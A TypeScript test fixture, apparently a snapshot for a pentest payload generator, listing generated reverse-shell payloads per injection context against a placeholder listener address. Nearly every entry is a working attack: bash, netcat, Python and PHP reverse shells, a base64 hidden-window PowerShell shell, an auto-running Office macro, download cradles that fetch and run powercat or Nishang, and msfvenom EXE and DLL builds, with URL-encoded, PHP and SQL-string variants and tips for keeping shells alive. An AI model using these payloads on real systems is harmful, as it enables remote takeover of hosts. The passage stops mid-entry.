/**
 * buildPayload output for every REVERSE_SHELLS, MSFVENOM and UPGRADE def in each of its contexts, with
 * V = { LHOST: "192.0.2.10", LPORT: "443" }, captured from 072cf01 before the listener refactor. Updated in the pre-lab
 * content round (2026-11-09): the two per-OS WARs merged into msf-java-war; DLL, HTA, Nishang, macro and upgrade notes.
 */
export const CATALOGUE_BEFORE: Record<string, Record<string, { text: string; prepare: string | null; notes: string[] }>> = {
  "bash-tcp": {
    "bash-prompt": {
      "text": "bash -i >& /dev/tcp/192.0.2.10/443 0>&1",
      "prepare": null,
      "notes": [
        "Pasted as-is at a real bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "injected-linux": {
      "text": "bash -c 'bash -i >& /dev/tcp/192.0.2.10/443 0>&1'",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...' because the injection point is not a bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "bash+-c+%27bash+-i+%3E%26+%2Fdev%2Ftcp%2F192.0.2.10%2F443+0%3E%261%27",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "php-system": {
      "text": "system('bash -c \\'bash -i >& /dev/tcp/192.0.2.10/443 0>&1\\'');",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...' (system() runs sh, not bash), then placed in a single-quoted PHP string; \\ and ' escaped.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "mkfifo-nc": {
    "bash-prompt": {
      "text": "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f",
      "prepare": null,
      "notes": [
        "Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e').",
        "Pasted as-is at a real bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "injected-linux": {
      "text": "bash -c 'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f'",
      "prepare": null,
      "notes": [
        "Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e').",
        "Wrapped in bash -c '...' because the injection point is not a bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "bash+-c+%27rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff%27",
      "prepare": null,
      "notes": [
        "Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e').",
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "bash+-c+%27rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff%27",
      "prepare": null,
      "notes": [
        "Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e').",
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "php-system": {
      "text": "system('bash -c \\'rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f\\'');",
      "prepare": null,
      "notes": [
        "Never nc -e on Linux: the stock nc rejects it (nc: invalid option -- 'e').",
        "Wrapped in bash -c '...' (system() runs sh, not bash), then placed in a single-quoted PHP string; \\ and ' escaped.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "mkfifo-nc-bg": {
    "bash-prompt": {
      "text": "(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f) &",
      "prepare": null,
      "notes": [
        "Use when the shell connects and then dies at once: the parent process is reaping it.",
        "Pasted as-is at a real bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "injected-linux": {
      "text": "bash -c '(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f) &'",
      "prepare": null,
      "notes": [
        "Use when the shell connects and then dies at once: the parent process is reaping it.",
        "Wrapped in bash -c '...' because the injection point is not a bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "bash+-c+%27(rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff)+%26%27",
      "prepare": null,
      "notes": [
        "Use when the shell connects and then dies at once: the parent process is reaping it.",
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "bash+-c+%27(rm+-f+%2Ftmp%2Ff%3B+mkfifo+%2Ftmp%2Ff%3B+cat+%2Ftmp%2Ff+%7C+%2Fbin%2Fsh+-i+2%3E%261+%7C+nc+192.0.2.10+443+%3E+%2Ftmp%2Ff)+%26%27",
      "prepare": null,
      "notes": [
        "Use when the shell connects and then dies at once: the parent process is reaping it.",
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "php-system": {
      "text": "system('bash -c \\'(rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.0.2.10 443 > /tmp/f) &\\'');",
      "prepare": null,
      "notes": [
        "Use when the shell connects and then dies at once: the parent process is reaping it.",
        "Wrapped in bash -c '...' (system() runs sh, not bash), then placed in a single-quoted PHP string; \\ and ' escaped.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "python3": {
    "bash-prompt": {
      "text": "python3 -c 'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'",
      "prepare": null,
      "notes": [
        "Pasted as-is at a real bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "injected-linux": {
      "text": "bash -c 'python3 -c '\\''import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")'\\'''",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...' because the injection point is not a bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "bash+-c+%27python3+-c+%27%5C%27%27import+socket,os,pty%3Bs%3Dsocket.socket()%3Bs.connect((%22192.0.2.10%22,443))%3B%5Bos.dup2(s.fileno(),f)+for+f+in+(0,1,2)%5D%3Bpty.spawn(%22%2Fbin%2Fbash%22)%27%5C%27%27%27",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "bash+-c+%27python3+-c+%27%5C%27%27import+socket,os,pty%3Bs%3Dsocket.socket()%3Bs.connect((%22192.0.2.10%22,443))%3B%5Bos.dup2(s.fileno(),f)+for+f+in+(0,1,2)%5D%3Bpty.spawn(%22%2Fbin%2Fbash%22)%27%5C%27%27%27",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "php-system": {
      "text": "system('bash -c \\'python3 -c \\'\\\\\\'\\'import socket,os,pty;s=socket.socket();s.connect((\"192.0.2.10\",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn(\"/bin/bash\")\\'\\\\\\'\\'\\'');",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...' (system() runs sh, not bash), then placed in a single-quoted PHP string; \\ and ' escaped.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "php-exec": {
    "bash-prompt": {
      "text": "php -r '$sock=fsockopen(\"192.0.2.10\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
      "prepare": null,
      "notes": [
        "Pasted as-is at a real bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "injected-linux": {
      "text": "bash -c 'php -r '\\''$sock=fsockopen(\"192.0.2.10\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\\'''",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...' because the injection point is not a bash prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "bash+-c+%27php+-r+%27%5C%27%27$sock%3Dfsockopen(%22192.0.2.10%22,443)%3Bexec(%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22)%3B%27%5C%27%27%27",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "bash+-c+%27php+-r+%27%5C%27%27$sock%3Dfsockopen(%22192.0.2.10%22,443)%3Bexec(%22%2Fbin%2Fsh+-i+%3C%263+%3E%263+2%3E%263%22)%3B%27%5C%27%27%27",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...', then URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "php-system": {
      "text": "system('bash -c \\'php -r \\'\\\\\\'\\'$sock=fsockopen(\"192.0.2.10\",443);exec(\"/bin/sh -i <&3 >&3 2>&3\");\\'\\\\\\'\\'\\'');",
      "prepare": null,
      "notes": [
        "Wrapped in bash -c '...' (system() runs sh, not bash), then placed in a single-quoted PHP string; \\ and ' escaped.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "ps-b64": {
    "cmd": {
      "text": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
      "prepare": null,
      "notes": [
        "A working shell makes the web request hang. If it returns at once, the payload did not hold the socket.",
        "Pasted as-is at cmd.exe.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "powershell": {
      "text": "powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
      "prepare": null,
      "notes": [
        "A working shell makes the web request hang. If it returns at once, the payload did not hold the socket.",
        "Pasted as-is at a PowerShell prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "powershell+-nop+-w+hidden+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
      "prepare": null,
      "notes": [
        "A working shell makes the web request hang. If it returns at once, the payload did not hold the socket.",
        "URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "powershell+-nop+-w+hidden+-e+JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlAG4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQAZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUANQAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0AGUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQAaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAPQAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQBOAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTAEMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZABhAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpAG4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQAcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAIAAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwAkAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuAGUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAKQA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQBuAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuAEwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHUAcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZQAoACkA",
      "prepare": null,
      "notes": [
        "A working shell makes the web request hang. If it returns at once, the payload did not hold the socket.",
        "URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "macro": {
      "text": "Sub MyMacro()\n    Dim Str As String\n    Str = Str + \"powershell -nop -w hidden -e JABjAGwAaQBlAG4AdAAgA\"\n    Str = Str + \"D0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0\"\n    Str = Str + \"ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAa\"\n    Str = Str + \"QBlAG4AdAAoACIAMQA5ADIALgAwAC4AMgAuADEAMAAiACwANAA\"\n    Str = Str + \"0ADMAKQA7ACQAcwB0AHIAZQBhAG0AIAA9ACAAJABjAGwAaQBlA\"\n    Str = Str + \"G4AdAAuAEcAZQB0AFMAdAByAGUAYQBtACgAKQA7AFsAYgB5AHQ\"\n    Str = Str + \"AZQBbAF0AXQAkAGIAeQB0AGUAcwAgAD0AIAAwAC4ALgA2ADUAN\"\n    Str = Str + \"QAzADUAfAAlAHsAMAB9ADsAdwBoAGkAbABlACgAKAAkAGkAIAA\"\n    Str = Str + \"9ACAAJABzAHQAcgBlAGEAbQAuAFIAZQBhAGQAKAAkAGIAeQB0A\"\n    Str = Str + \"GUAcwAsACAAMAAsACAAJABiAHkAdABlAHMALgBMAGUAbgBnAHQ\"\n    Str = Str + \"AaAApACkAIAAtAG4AZQAgADAAKQB7ADsAJABkAGEAdABhACAAP\"\n    Str = Str + \"QAgACgATgBlAHcALQBPAGIAagBlAGMAdAAgAC0AVAB5AHAAZQB\"\n    Str = Str + \"OAGEAbQBlACAAUwB5AHMAdABlAG0ALgBUAGUAeAB0AC4AQQBTA\"\n    Str = Str + \"EMASQBJAEUAbgBjAG8AZABpAG4AZwApAC4ARwBlAHQAUwB0AHI\"\n    Str = Str + \"AaQBuAGcAKAAkAGIAeQB0AGUAcwAsADAALAAgACQAaQApADsAJ\"\n    Str = Str + \"ABzAGUAbgBkAGIAYQBjAGsAIAA9ACAAKABpAGUAeAAgACQAZAB\"\n    Str = Str + \"hAHQAYQAgADIAPgAmADEAIAB8ACAATwB1AHQALQBTAHQAcgBpA\"\n    Str = Str + \"G4AZwAgACkAOwAkAHMAZQBuAGQAYgBhAGMAawAyACAAPQAgACQ\"\n    Str = Str + \"AcwBlAG4AZABiAGEAYwBrACAAKwAgACIAUABTACAAIgAgACsAI\"\n    Str = Str + \"AAoAHAAdwBkACkALgBQAGEAdABoACAAKwAgACIAPgAgACIAOwA\"\n    Str = Str + \"kAHMAZQBuAGQAYgB5AHQAZQAgAD0AIAAoAFsAdABlAHgAdAAuA\"\n    Str = Str + \"GUAbgBjAG8AZABpAG4AZwBdADoAOgBBAFMAQwBJAEkAKQAuAEc\"\n    Str = Str + \"AZQB0AEIAeQB0AGUAcwAoACQAcwBlAG4AZABiAGEAYwBrADIAK\"\n    Str = Str + \"QA7ACQAcwB0AHIAZQBhAG0ALgBXAHIAaQB0AGUAKAAkAHMAZQB\"\n    Str = Str + \"uAGQAYgB5AHQAZQAsADAALAAkAHMAZQBuAGQAYgB5AHQAZQAuA\"\n    Str = Str + \"EwAZQBuAGcAdABoACkAOwAkAHMAdAByAGUAYQBtAC4ARgBsAHU\"\n    Str = Str + \"AcwBoACgAKQB9ADsAJABjAGwAaQBlAG4AdAAuAEMAbABvAHMAZ\"\n    Str = Str + \"QAoACkA\"\n    CreateObject(\"Wscript.Shell\").Run Str\nEnd Sub\n\nSub AutoOpen()\n    MyMacro\nEnd Sub\n\nSub Document_Open()\n    MyMacro\nEnd Sub",
      "prepare": null,
      "notes": [
        "A working shell makes the web request hang. If it returns at once, the payload did not hold the socket.",
        "Office macro: paste into the VBA editor. The command is split into 50-character chunks (VBA lines max ~1023), \" doubled and line breaks as vbCrLf, and run by AutoOpen/Document_Open.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "powercat-cradle": {
    "powershell": {
      "text": "IEX(New-Object System.Net.WebClient).DownloadString('http://192.0.2.10/powercat.ps1');powercat -c 192.0.2.10 -p 443 -e powershell",
      "prepare": "cp /usr/share/windows-resources/powercat/powercat.ps1 .\npython3 -m http.server 80",
      "notes": [
        "Run from a PowerShell prompt. To use it from cmd, a macro or a SQL string, base64 it for -e first.",
        "Pasted as-is at a PowerShell prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "nishang-cradle": {
    "cmd": {
      "text": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')\"",
      "prepare": "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 443' >> rev.ps1\npython3 -m http.server 80",
      "notes": [
        "Pasted as-is at cmd.exe.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "powershell": {
      "text": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString('http://192.0.2.10/rev.ps1')\"",
      "prepare": "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 443' >> rev.ps1\npython3 -m http.server 80",
      "notes": [
        "Pasted as-is at a PowerShell prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "sql-string": {
      "text": "powershell -nop -w hidden -c \"IEX(New-Object Net.WebClient).DownloadString(''http://192.0.2.10/rev.ps1'')\"",
      "prepare": "cp /usr/share/nishang/Shells/Invoke-PowerShellTcp.ps1 rev.ps1\necho 'Invoke-PowerShellTcp -Reverse -IPAddress 192.0.2.10 -Port 443' >> rev.ps1\npython3 -m http.server 80",
      "notes": [
        "Inside a SQL string the single quotes are doubled, so it survives xp_cmdshell '...'.",
        "Single quotes doubled for a SQL string literal.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "nc-exe": {
    "cmd": {
      "text": "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443",
      "prepare": null,
      "notes": [
        "Needs an nc.exe built with -e; if it returns instantly, the build has no -e.",
        "Pasted as-is at cmd.exe.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "powershell": {
      "text": "C:\\Windows\\Temp\\nc.exe -e cmd.exe 192.0.2.10 443",
      "prepare": null,
      "notes": [
        "Needs an nc.exe built with -e; if it returns instantly, the build has no -e.",
        "Pasted as-is at a PowerShell prompt.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "webshell-param": {
      "text": "C:%5CWindows%5CTemp%5Cnc.exe+-e+cmd.exe+192.0.2.10+443",
      "prepare": null,
      "notes": [
        "Needs an nc.exe built with -e; if it returns instantly, the build has no -e.",
        "URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    },
    "url-param": {
      "text": "C:%5CWindows%5CTemp%5Cnc.exe+-e+cmd.exe+192.0.2.10+443",
      "prepare": null,
      "notes": [
        "Needs an nc.exe built with -e; if it returns instantly, the build has no -e.",
        "URL-encoded (spaces as +).",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-win-x64-exe": {
    "bash-prompt": {
      "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f exe -o rev.exe",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
        "No penelope? rlwrap nc -lvnp 443"
      ]
    }
  },
  "msf-win-x64-dll": {
    "bash-prompt": {
      "text": "msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.0.2.10 LPORT=443 -f dll -o rev.dll",
      "prepare": null,
      "notes": [
        "Catch it with penelope, or nc; no multi/handler needed for stageless shell.",
        "Check the target first (systeminfo System Type / uname -m): an x64 file will not run on x86.",
        "To run it by hand: rundll32 C:\\path\\to\\rev.dll,x. The shell starts from DllMain when the DLL loads, so any export name works; rundll32 may then complain the entry point is missing, and the shell still runs.",
        "Pasted as-is at a real bash prompt.",
        "LHOST and LPORT are baked into the served script: regenerate it if either changes.",
